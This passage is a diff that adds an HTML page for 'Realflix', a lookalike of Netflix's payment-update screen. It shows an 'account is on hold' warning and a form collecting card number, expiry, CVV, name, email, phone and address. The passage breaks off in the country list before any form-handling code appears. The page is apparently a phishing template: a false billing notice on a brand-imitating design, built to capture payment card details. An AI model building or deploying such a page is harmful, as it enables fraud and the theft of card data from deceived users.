@@ -1,0 +1,1639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Realflix – Update Payment Method</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --red: #e50914;
+    --red-dark: #b20710;
+    --bg-top: #141414;
+    --bg-bottom: #141414;
+    --text: #fff;
+    --text-muted: #b3b3b3;
+    --text-dim: #737373;
+    --input-border: #808080;
+    --footer-bg: #232323;
+    --success: #46d369;
+  }
+
+  html, body { height: 100%; font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    background: linear-gradient(to bottom, var(--bg-top) 0%, #0d0d0d 40%, var(--bg-bottom) 100%);
+    color: var(--text);
+  }
+
+  /* ── Header ── */
+  header {
+    padding: 18px 56px;
+    border-bottom: 1px solid rgba(255,255,255,0.08);
+  }
+  .logo {
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: 2.2rem;
+    color: var(--red);
+    text-decoration: none;
+    letter-spacing: 3px;
+    display: inline-block;
+  }
+
+  /* ── Main ── */
+  main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 46px 20px 80px;
+  }
+
+  .form-wrapper {
+    width: 100%;
+    max-width: 500px;
+  }
+
+  /* ── Hold banner ── */
+  .hold-banner {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    background: rgba(229,9,20,0.1);
+    border: 1px solid rgba(229,9,20,0.35);
+    border-radius: 4px;
+    padding: 14px 16px;
+    margin-bottom: 28px;
+    animation: fadeUp 0.4s ease both;
+  }
+  .hold-banner-icon { flex-shrink: 0; margin-top: 1px; }
+  .hold-banner h3   { font-size: 0.9rem; font-weight: 600; color: #ff5f5f; margin-bottom: 3px; }
+  .hold-banner p    { font-size: 0.8rem; color: var(--text-muted); line-height: 1.5; }
+
+  /* ── Page heading ── */
+  h1 {
+    font-size: 2rem;
+    font-weight: 700;
+    margin-bottom: 6px;
+    letter-spacing: -0.3px;
+    animation: fadeUp 0.4s ease 0.05s both;
+  }
+  .subtitle {
+    font-size: 0.95rem;
+    color: var(--text-muted);
+    margin-bottom: 26px;
+    animation: fadeUp 0.4s ease 0.08s both;
+  }
+
+  /* ── 2 Payment tabs ── */
+  .pay-tabs {
+    display: flex;
+    border: 1px solid var(--input-border);
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 16px;
+    animation: fadeUp 0.4s ease 0.1s both;
+  }
+  .pay-tab {
+    flex: 1;
+    padding: 12px 6px;
+    background: transparent;
+    border: none;
+    border-right: 1px solid var(--input-border);
+    color: var(--text-muted);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    transition: all 0.15s;
+  }
+  .pay-tab:last-child { border-right: none; }
+  .pay-tab.active     { background: var(--red); color: #fff; }
+  .pay-tab:not(.active):hover { color: #fff; }
+
+  /* ── Inline card brand logo inside card number input ── */
+  .card-num-brand {
+    position: absolute;
+    right: 14px; top: 50%; transform: translateY(-50%);
+    width: 44px; height: 28px;
+    display: flex; align-items: center; justify-content: center;
+    pointer-events: none;
+    transition: opacity 0.2s;
+  }
+  .card-num-brand svg, .card-num-brand img { width: 100%; height: auto; }
+  /* When there's an error dot, hide brand */
+  .input-wrap.has-error .card-num-brand { display: none; }
+  /* Card number input gets extra right padding for the brand logo */
+  #w_cardNum input { padding-right: 62px; }
+
+  /* ── Section divider ── */
+  .section-sep {
+    display: flex; align-items: center; gap: 10px;
+    margin: 22px 0 18px;
+  }
+  .section-sep span {
+    font-size: 0.72rem; font-weight: 600; text-transform: uppercase;
+    letter-spacing: 0.8px; color: var(--text-dim); white-space: nowrap;
+  }
+  .section-sep::before,.section-sep::after {
+    content: ''; flex: 1; height: 1px; background: rgba(255,255,255,0.1);
+  }
+
+  /* ── Floating-label inputs (exact match to index.html) ── */
+  .input-wrap {
+    position: relative;
+    margin-bottom: 6px;
+  }
+  /* Phone field with country selector */
+  .phone-combined-wrap {
+    display: flex;
+    align-items: center;
+    height: 56px;
+    background: #141414;
+    border: 1px solid var(--input-border);
+    border-radius: 4px;
+    transition: border-color 0.15s;
+    overflow: visible;
+  }
+  .phone-combined-wrap:focus-within {
+    border-color: var(--input-focus);
+  }
+  #phoneDialBtn {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0 10px 0 14px;
+    color: var(--text);
+    font-size: 0.88rem;
+    font-family: 'Inter', sans-serif;
+    white-space: nowrap;
+    flex-shrink: 0;
+    height: 100%;
+  }
+  #phoneDialBtn:hover { background: rgba(255,255,255,0.04); }
+  #phoneFlag { font-size: 1.1rem; line-height: 1; }
+  #phoneCode { font-size: 0.85rem; color: #ccc; }
+  .phone-divider {
+    width: 1px; height: 28px;
+    background: var(--input-border);
+    flex-shrink: 0;
+  }
+  .phone-input-inner {
+    flex: 1;
+    position: relative;
+    height: 100%;
+  }
+  .phone-input-inner input {
+    width: 100%; height: 100%;
+    padding: 18px 16px 0 12px;
+    background: transparent;
+    border: none;
+    color: var(--text);
+    font-size: 1rem;
+    font-family: 'Inter', sans-serif;
+    outline: none;
+    caret-color: #fff;
+  }
+  .phone-input-inner input::placeholder {
+    color: transparent;
+  }
+  .phone-input-inner label {
+    position: absolute;
+    left: 12px; top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-muted);
+    font-size: 1rem;
+    pointer-events: none;
+    transition: all 0.15s ease;
+  }
+  .phone-input-inner input:focus ~ label,
+  .phone-input-inner input:not(:placeholder-shown) ~ label {
+    top: 10px;
+    transform: none;
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    letter-spacing: 0.2px;
+  }
+  /* Custom phone dropdown */
+  .phone-dropdown {
+    position: absolute;
+    top: calc(100% + 4px);
+    left: 0;
+    width: 100%;
+    background: #1e1e1e;
+    border: 1px solid var(--input-border);
+    border-radius: 6px;
+    z-index: 999;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    overflow: hidden;
+  }
+  .phone-dropdown-search {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--input-border);
+  }
+  .phone-dropdown-search input {
+    flex: 1;
+    background: none;
+    border: none;
+    color: var(--text);
+    font-size: 0.9rem;
+    font-family: 'Inter', sans-serif;
+    outline: none;
+  }
+  .phone-dropdown-search input::placeholder { color: #666; }
+  #phoneCountryList {
+    list-style: none;
+    margin: 0; padding: 4px 0;
+    max-height: 220px;
+    overflow-y: auto;
+  }
+  #phoneCountryList::-webkit-scrollbar { width: 4px; }
+  #phoneCountryList::-webkit-scrollbar-track { background: transparent; }
+  #phoneCountryList::-webkit-scrollbar-thumb { background: #444; border-radius: 2px; }
+  #phoneCountryList li {
+    padding: 9px 14px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  #phoneCountryList li:hover { background: rgba(255,255,255,0.07); }
+  #phoneCountryList li.selected { background: rgba(229,9,20,0.15); }
+  #phoneCountryList li .pc-name { flex: 1; }
+  #phoneCountryList li .pc-code { color: #888; font-size: 0.82rem; }
+  .input-wrap input,
+  .input-wrap select {
+    width: 100%; height: 56px;
+    padding: 18px 46px 0 16px;
+    background: #141414;
+    border: 1px solid var(--input-border);
+    border-radius: 4px;
+    color: var(--text);
+    font-size: 1rem;
+    font-family: 'Inter', sans-serif;
+    outline: none;
+    transition: border-color 0.15s, background 0.15s;
+    caret-color: #fff;
+    -webkit-appearance: none; appearance: none;
+  }
+  .input-wrap select { cursor: pointer; }
+  .input-wrap select option {
+    background: #141414;
+    color: var(--text);
+  }
+  .input-wrap select option:disabled {
+    color: var(--text-dim);
+  }
+  .input-wrap input:focus,
+  .input-wrap select:focus { border-color: #fff; }
+  .input-wrap input.error-input,
+  .input-wrap select.error-input { border-color: var(--red); }
+  .input-wrap label {
+    position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+    color: var(--text-muted); font-size: 1rem;
+    pointer-events: none; transition: all 0.15s;
+  }
+  .input-wrap input:focus ~ label,
+  .input-wrap input:not(:placeholder-shown) ~ label,
+  .input-wrap select:focus ~ label,
+  .input-wrap select.has-value ~ label {
+    top: 10px; transform: none;
+    font-size: 0.7rem; color: var(--text-muted); letter-spacing: 0.2px;
+  }
+  .input-wrap input::placeholder { color: transparent; }
+  .select-arrow {
+    position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+    pointer-events: none; color: var(--text-muted);
+  }
+  .input-dot {
+    position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+    width: 7px; height: 7px; background: var(--red); border-radius: 50%; display: none;
+  }
+  .input-wrap.has-error .input-dot    { display: block; }
+  .input-wrap.has-error .select-arrow { display: none; }
+
+  /* ── 2-col row ── */
+  .input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .field-gap { margin-top: 10px; }
+
+  /* ── Error line (exact match to index.html) ── */
+  .error-line {
+    display: none; align-items: center; gap: 6px;
+    color: var(--red); font-size: 0.82rem;
+    margin-top: 6px; margin-bottom: 4px;
+  }
+  .error-line.show { display: flex; }
+  .error-line svg  { flex-shrink: 0; }
+
+  /* ── Checkbox ── */
+  .check-row {
+    display: flex; align-items: center; gap: 10px;
+    margin-top: 12px; cursor: pointer; user-select: none;
+  }
+  .check-box {
+    width: 18px; height: 18px; border-radius: 3px;
+    border: 1px solid var(--input-border); background: transparent;
+    flex-shrink: 0; display: flex; align-items: center; justify-content: center;
+    transition: all 0.15s;
+  }
+  .check-box.checked { background: var(--red); border-color: var(--red); }
+  .check-label { font-size: 0.85rem; color: var(--text-muted); }
+
+  /* ── Security note ── */
+  .sec-note {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 0.78rem; color: var(--text-dim); margin-top: 14px;
+  }
+
+  /* ── Submit button ── */
+  .btn-continue {
+    width: 100%; height: 52px; margin-top: 18px;
+    background: var(--red); color: #fff;
+    font-size: 1rem; font-weight: 600;
+    font-family: 'Inter', sans-serif;
+    border: none; border-radius: 4px;
+    cursor: pointer; transition: background 0.15s; letter-spacing: 0.2px;
+  }
+  .btn-continue:hover    { background: #f40612; }
+  .btn-continue:active   { background: var(--red-dark); }
+  .btn-continue:disabled { opacity: 0.7; cursor: not-allowed; }
+
+  /* ── reCAPTCHA ── */
+  .recaptcha {
+    margin-top: 22px; font-size: 0.8rem;
+    color: var(--text-dim); line-height: 1.6;
+  }
+  .recaptcha a { color: var(--text-dim); text-decoration: underline; }
+  .recaptcha a:hover { color: var(--text-muted); }
+
+  /* ── Panel toggle ── */
+  #giftPanel { display: none; }
+  #giftPanel.show { display: block; }
+
+  /* ── Success ── */
+  #successSection {
+    display: none; flex-direction: column; align-items: center;
+    text-align: center; padding: 60px 20px;
+    min-height: 60vh; justify-content: center;
+  }
+  #successSection.show { display: flex; animation: fadeIn 0.5s ease both; }
+  .success-icon {
+    width: 96px; height: 96px; border-radius: 50%;
+    border: 2.5px solid var(--success);
+    background: rgba(70,211,105,0.08);
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 28px;
+    box-shadow: 0 0 40px rgba(70,211,105,0.15);
+    animation: popIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+  }
+  .success-title {
+    font-size: 2.2rem; font-weight: 700;
+    letter-spacing: -0.5px; margin-bottom: 12px;
+  }
+  .success-subtitle {
+    font-size: 1.05rem; color: var(--text-muted);
+    max-width: 380px; line-height: 1.6; margin-bottom: 32px;
+  }
+  .success-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 10px 22px; border-radius: 50px;
+    background: rgba(70,211,105,0.1); border: 1px solid rgba(70,211,105,0.35);
+    font-size: 0.88rem; font-weight: 600; color: var(--success);
+    letter-spacing: 0.2px;
+  }
+  .success-divider {
+    width: 48px; height: 3px; background: rgba(70,211,105,0.4);
+    border-radius: 2px; margin: 28px auto;
+  }
+  .success-note {
+    font-size: 0.82rem; color: var(--text-dim);
+    margin-top: 8px;
+  }
+
+  /* ── Footer ── */
+  footer { background: var(--footer-bg); padding: 36px 56px 28px; color: var(--text-muted); }
+  footer .footer-phone { font-size: 0.95rem; margin-bottom: 24px; }
+  footer .footer-links {
+    display: grid; grid-template-columns: repeat(4,auto);
+    gap: 12px 0; margin-bottom: 20px; width: fit-content;
+  }
+  footer .footer-links a {
+    color: var(--text-dim); font-size: 0.8rem;
+    text-decoration: none; padding-right: 32px;
+  }
+  footer .footer-links a:hover { text-decoration: underline; }
+  footer .footer-lang {
+    display: inline-flex; align-items: center; gap: 8px;
+    border: 1px solid var(--text-dim); border-radius: 4px;
+    padding: 6px 14px; font-size: 0.85rem; color: var(--text-muted);
+    cursor: pointer; background: none; font-family: 'Inter',sans-serif; margin-top: 8px;
+  }
+  footer .footer-lang:hover { border-color: var(--text-muted); }
+
+  /* ── Animations ── */
+  @keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)}  to{opacity:1;transform:translateY(0)} }
+  @keyframes popIn  { from{transform:scale(.5);opacity:0}        to{transform:scale(1);opacity:1}      }
+  @keyframes spin   { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+
+  @media (max-width:600px) {
+    header { padding: 18px 24px; }
+    main   { padding: 36px 20px 60px; }
+    footer { padding: 28px 24px 24px; }
+    footer .footer-links { grid-template-columns: repeat(2,auto); }
+    h1     { font-size: 1.6rem; }
+    .input-row { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <a class="logo" href="#">REALFLIX</a>
+</header>
+
+<main>
+  <div class="form-wrapper">
+
+    <!-- Account Hold Banner -->
+    <div class="hold-banner" id="holdBanner">
+      <div class="hold-banner-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="10" stroke="#ff5f5f" stroke-width="2"/>
+          <line x1="12" y1="8" x2="12" y2="12" stroke="#ff5f5f" stroke-width="2" stroke-linecap="round"/>
+          <circle cx="12" cy="16" r="1" fill="#ff5f5f"/>
+        </svg>
+      </div>
+      <div>
+        <h3>Your account is on hold</h3>
+        <p>We had trouble processing your last payment. Update your payment method to restore access.</p>
+      </div>
+    </div>
+
+    <!-- ══ MAIN FORM ══ -->
+    <div id="mainForm">
+      <h1>Update payment method</h1>
+      <p class="subtitle">Or get started with a new account.</p>
+
+      <!-- 2 Tabs: Credit/Debit + Gift Card -->
+      <div class="pay-tabs">
+        <button class="pay-tab active" id="tabCard" onclick="setTab('card')" type="button">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
+          </svg>
+          Credit / Debit Card
+        </button>
+        <button class="pay-tab" id="tabGift" onclick="setTab('gift')" type="button">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <polyline points="20 12 20 22 4 22 4 12"/>
+            <rect x="2" y="7" width="20" height="5"/>
+            <line x1="12" y1="22" x2="12" y2="7"/>
+            <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/>
+            <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/>
+          </svg>
+          Gift Card
+        </button>
+      </div>
+
+      <!-- ─── CREDIT/DEBIT PANEL ─── -->
+      <div id="cardPanel">
+
+        <!-- Name on card -->
+        <div class="input-wrap" id="w_cardName">
+          <input type="text" id="cardName" placeholder="x" autocomplete="cc-name"
+            oninput="clearErr('w_cardName','e_cardName')">
+          <label for="cardName">Name on card</label>
+          <span class="input-dot"></span>
+        </div>
+        <div class="error-line" id="e_cardName">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+          Please enter the name as it appears on your card.
+        </div>
+
+        <!-- Card number — brand logo appears inside field on right -->
+        <div class="input-wrap field-gap" id="w_cardNum">
+          <input type="text" id="cardNum" placeholder="x" maxlength="19" autocomplete="cc-number"
+            oninput="fmtCard(this); clearErr('w_cardNum','e_cardNum')">
+          <label for="cardNum">Card number</label>
+          <span class="input-dot"></span>
+          <!-- Brand logo injected here by JS -->
+          <div class="card-num-brand" id="cardNumBrand"></div>
+        </div>
+        <div class="error-line" id="e_cardNum">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+          <span id="e_cardNum_msg">Please enter a valid card number.</span>
+        </div>
+
+        <!-- Expiry + CVV -->
+        <div class="input-row field-gap">
+          <div>
+            <div class="input-wrap" id="w_cardExp">
+              <input type="text" id="cardExp" placeholder="x" maxlength="7" autocomplete="cc-exp"
+                oninput="fmtExpiry(this); clearErr('w_cardExp','e_cardExp')">
+              <label for="cardExp">Expiry (MM / YY)</label>
+              <span class="input-dot"></span>
+            </div>
+            <div class="error-line" id="e_cardExp">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+              <span id="e_cardExp_msg">Enter a valid expiry date (MM / YY).</span>
+            </div>
+          </div>
+          <div>
+            <div class="input-wrap" id="w_cardCvv">
+              <input type="password" id="cardCvv" placeholder="x" maxlength="4" autocomplete="cc-csc"
+                oninput="clearErr('w_cardCvv','e_cardCvv')">
+              <label for="cardCvv">CVV / CVC</label>
+              <span class="input-dot"></span>
+            </div>
+            <div class="error-line" id="e_cardCvv">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+              <span id="e_cardCvv_msg">Enter a valid CVV / CVC.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- ─── Billing Information ─── -->
+        <div class="section-sep"><span>Billing information</span></div>
+
+        <!-- First + Last -->
+        <div class="input-row">
+          <div>
+            <div class="input-wrap" id="w_bFirst">
+              <input type="text" id="bFirst" placeholder="x" autocomplete="given-name"
+                oninput="clearErr('w_bFirst','e_bFirst')">
+              <label for="bFirst">First name</label>
+              <span class="input-dot"></span>
+            </div>
+            <div class="error-line" id="e_bFirst">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+              Please enter a valid first name.
+            </div>
+          </div>
+          <div>
+            <div class="input-wrap" id="w_bLast">
+              <input type="text" id="bLast" placeholder="x" autocomplete="family-name"
+                oninput="clearErr('w_bLast','e_bLast')">
+              <label for="bLast">Last name</label>
+              <span class="input-dot"></span>
+            </div>
+            <div class="error-line" id="e_bLast">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+              Please enter a valid last name.
+            </div>
+          </div>
+        </div>
+
+        <!-- Email -->
+        <div class="input-wrap field-gap" id="w_bEmail">
+          <input type="email" id="bEmail" placeholder="x" autocomplete="email"
+            oninput="clearErr('w_bEmail','e_bEmail')">
+          <label for="bEmail">Email address</label>
+          <span class="input-dot"></span>
+        </div>
+        <div class="error-line" id="e_bEmail">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+          Please enter a valid email address.
+        </div>
+
+        <!-- Phone (optional) -->
+        <div class="field-gap" id="phone-field-container" style="position:relative;">
+          <div class="phone-combined-wrap" id="w_bPhone" style="border-color: var(--input-border)">
+            <button type="button" id="phoneDialBtn" onclick="togglePhoneDropdown()" aria-haspopup="listbox">
+              <span id="phoneFlag">🇮🇳</span>
+              <span id="phoneCode">+91</span>
+              <svg width="10" height="6" viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="#999" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            </button>
+            <div class="phone-divider"></div>
+            <div class="phone-input-inner">
+              <input type="tel" id="bPhone" placeholder="x" autocomplete="new-password" name="phone_number_field" maxlength="10" oninput="this.value=this.value.replace(/\D/g,''); clearErr('w_bPhone','e_bPhone')">
+              <label for="bPhone">Phone number</label>
+            </div>
+          </div>
+          <div class="error-line" id="e_bPhone">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+            Please enter a valid 10-digit phone number.
+          </div>
+          <!-- Custom dropdown -->
+          <div id="phoneDropdown" class="phone-dropdown" style="display:none;">
+            <div class="phone-dropdown-search">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><circle cx="11" cy="11" r="7" stroke="#999" stroke-width="2"/><path d="M20 20l-3.5-3.5" stroke="#999" stroke-width="2" stroke-linecap="round"/></svg>
+              <input type="text" id="phoneSearch" placeholder="Search country..." oninput="filterPhoneCountries(this.value)" autocomplete="off">
+            </div>
+            <ul id="phoneCountryList" role="listbox"></ul>
+          </div>
+        </div>
+
+        <!-- Street address -->
+        <div class="input-wrap field-gap" id="w_bAddr">
+          <input type="text" id="bAddr" placeholder="x" autocomplete="street-address"
+            oninput="clearErr('w_bAddr','e_bAddr')">
+          <label for="bAddr">Street address</label>
+          <span class="input-dot"></span>
+        </div>
+        <div class="error-line" id="e_bAddr">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+          Please enter your address.
+        </div>
+
+        <!-- Country -->
+        <div class="input-wrap field-gap" id="w_bCountry">
+          <select id="bCountry" onchange="onCountryChange(this)">
+            <option value="" disabled selected></option>
+            <!-- Popular / top picks -->
+            <option value="IN">🇮🇳 India</option>
+            <option value="US">🇺🇸 United States</option>
+            <option value="GB">🇬🇧 United Kingdom</option>
+            <option value="CA">🇨🇦 Canada</option>
+            <option value="AU">🇦🇺 Australia</option>
+            <option value="DE">🇩🇪 Germany</option>
+            <option value="FR">🇫🇷 France</option>
+            <option value="JP">🇯🇵 Japan</option>
+            <option value="BR">🇧🇷 Brazil</option>
+            <option value="MX">🇲🇽 Mexico</option>
+            <option disabled>──────────────</option>
+            <!-- A -->
+            <option value="AF">🇦🇫 Afghanistan</option>
+            <option value="AL">🇦🇱 Albania</option>
+            <option value="DZ">🇩🇿 Algeria</option>
+            <option value="AO">🇦🇴 Angola</option>
+            <option value="AG">🇦🇬 Antigua and Barbuda</option>
+            <option value="AR">🇦🇷 Argentina</option>
+            <option value="AM">🇦🇲 Armenia</option>
+            <option value="AW">🇦🇼 Aruba</option>
+            <option value="AT">🇦🇹 Austria</option>
+            <option value="AZ">🇦🇿 Azerbaijan</option>
+            <!-- B -->
+            <option value="BS">🇧🇸 Bahamas</option>
+            <option value="BH">🇧🇭 Bahrain</option>
+            <option value="BD">🇧🇩 Bangladesh</option>
+            <option value="BB">🇧🇧 Barbados</option>
+            <option value="BY">🇧🇾 Belarus</option>
+            <option value="BE">🇧🇪 Belgium</option>
+            <option value="BZ">🇧🇿 Belize</option>
+            <option value="BJ">🇧🇯 Benin</option>
+            <option value="BT">🇧🇹 Bhutan</option>
+            <option value="BO">🇧🇴 Bolivia</option>
+            <option value="BA">🇧🇦 Bosnia and Herzegovina</option>
+            <option value="BW">🇧🇼 Botswana</option>
+            <option value="BN">🇧🇳 Brunei</option>
+            <option value="BG">🇧🇬 Bulgaria</option>
+            <option value="BF">🇧🇫 Burkina Faso</option>
+            <!-- C -->
+            <option value="KH">🇰🇭 Cambodia</option>
+            <option value="CM">🇨🇲 Cameroon</option>
+            <option value="CV">🇨🇻 Cape Verde</option>
+            <option value="CL">🇨🇱 Chile</option>
+            <option value="CO">🇨🇴 Colombia</option>
+            <option value="KM">🇰🇲 Comoros</option>
+            <option value="CG">🇨🇬 Congo</option>
+            <option value="CR">🇨🇷 Costa Rica</option>
+            <option value="HR">🇭🇷 Croatia</option>
+            <option value="CY">🇨🇾 Cyprus</option>
+            <option value="CZ">🇨🇿 Czech Republic</option>
+            <!-- D -->
+            <option value="DK">🇩🇰 Denmark</option>
+            <option value="DJ">🇩🇯 Djibouti</option>
+            <option value="DM">🇩🇲 Dominica</option>
+            <option value="DO">🇩🇴 Dominican Republic</option>
+            <!-- E -->
+            <option value="EC">🇪🇨 Ecuador</option>
+            <option value="EG">🇪🇬 Egypt</option>
+            <option value="SV">🇸🇻 El Salvador</option>
+            <option value="GQ">🇬🇶 Equatorial Guinea</option>
+            <option value="EE">🇪🇪 Estonia</option>
+            <option value="ET">🇪🇹 Ethiopia</option>
+            <!-- F -->
+            <option value="FJ">🇫🇯 Fiji</option>
+            <option value="FI">🇫🇮 Finland</option>
+            <!-- G -->
+            <option value="GA">🇬🇦 Gabon</option>
+            <option value="GM">🇬🇲 Gambia</option>
+            <option value="GE">🇬🇪 Georgia</option>
+            <option value="GH">🇬🇭 Ghana</option>
+            <option value="GR">🇬🇷 Greece</option>
+            <option value="GD">🇬🇩 Grenada</option>
+            <option value="GT">🇬🇹 Guatemala</option>
+            <option value="GN">🇬🇳 Guinea</option>
+            <option value="GW">🇬🇼 Guinea-Bissau</option>
+            <option value="GY">🇬🇾 Guyana</option>
+            <!-- H -->
+            <option value="HT">🇭🇹 Haiti</option>
+            <option value="HN">🇭🇳 Honduras</option>
+            <option value="HK">🇭🇰 Hong Kong</option>
+            <option value="HU">🇭🇺 Hungary</option>
+            <!-- I -->
+            <option value="IS">🇮🇸 Iceland</option>
+            <option value="ID">🇮🇩 Indonesia</option>
+            <option value="IQ">🇮🇶 Iraq</option>
+            <option value="IE">🇮🇪 Ireland</option>
+            <option value="IL">🇮🇱 Israel</option>
+            <option value="IT">🇮🇹 Italy</option>
+            <option value="CI">🇨🇮 Ivory Coast</option>
+            <!-- J -->
+            <option value="JM">🇯🇲 Jamaica</option>
+            <option value="JO">🇯🇴 Jordan</option>
+            <!-- K -->
+            <option value="KZ">🇰🇿 Kazakhstan</option>
+            <option value="KE">🇰🇪 Kenya</option>
+            <option value="KW">🇰🇼 Kuwait</option>
+            <option value="KG">🇰🇬 Kyrgyzstan</option>
+            <!-- L -->
+            <option value="LA">🇱🇦 Laos</option>
+            <option value="LV">🇱🇻 Latvia</option>
+            <option value="LB">🇱🇧 Lebanon</option>
+            <option value="LS">🇱🇸 Lesotho</option>
+            <option value="LR">🇱🇷 Liberia</option>
+            <option value="LY">🇱🇾 Libya</option>
+            <option value="LI">🇱🇮 Liechtenstein</option>
+            <option value="LT">🇱🇹 Lithuania</option>
+            <option value="LU">🇱🇺 Luxembourg</option>
+            <!-- M -->
+            <option value="MO">🇲🇴 Macau</option>
+            <option value="MG">🇲🇬 Madagascar</option>
+            <option value="MW">🇲🇼 Malawi</option>
+            <option value="MY">🇲🇾 Malaysia</option>
+            <option value="MV">🇲🇻 Maldives</option>
+            <option value="ML">🇲🇱 Mali</option>
+            <option value="MT">🇲🇹 Malta</option>
+            <option value="MR">🇲🇷 Mauritania</option>
+            <option value="MU">🇲🇺 Mauritius</option>
+            <option value="MD">🇲🇩 Moldova</option>
+            <option value="MN">🇲🇳 Mongolia</option>
+            <option value="ME">🇲🇪 Montenegro</option>
+            <option value="MA">🇲🇦 Morocco</option>
+            <option value="MZ">🇲🇿 Mozambique</option>
+            <option value="MM">🇲🇲 Myanmar</option>
+            <!-- N -->
+            <option value="NA">🇳🇦 Namibia</option>
+            <option value="NP">🇳🇵 Nepal</option>
+            <option value="NL">🇳🇱 Netherlands</option>
+            <option value="NZ">🇳🇿 New Zealand</option>
+            <option value="NI">🇳🇮 Nicaragua</option>
+            <option value="NE">🇳🇪 Niger</option>
+            <option value="NG">🇳🇬 Nigeria</option>
+            <option value="MK">🇲🇰 North Macedonia</option>
+            <option value="NO">🇳🇴 Norway</option>
+            <!-- O -->
+            <option value="OM">🇴🇲 Oman</option>
+            <!-- P -->
